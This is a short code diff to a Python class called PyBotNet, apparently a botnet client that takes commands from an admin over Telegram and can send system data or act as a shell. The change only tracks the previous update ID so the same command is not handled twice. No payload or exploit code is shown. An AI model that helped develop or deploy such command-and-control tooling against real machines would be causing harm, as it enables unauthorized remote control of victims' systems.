@@ -28,6 +28,7 @@ class PyBotNet:
         self.send_system_data = send_system_data  # send system info in message
         self.is_shell = is_shell
 
+        self.previous_update_id = [0]
         self.start_time = util.get_current_epoc_time()
 
         # logging:
@@ -75,7 +76,7 @@ class PyBotNet:
         # if message list not False > extract last message from admin > if last admin message not False return
         if messages_list:
             last_message = util.extract_last_admin_command(
-                messages_list, self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN, self.logger)
+                messages_list, self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN, self.logger, self.previous_update_id)
 
             if last_message:
                 return last_message
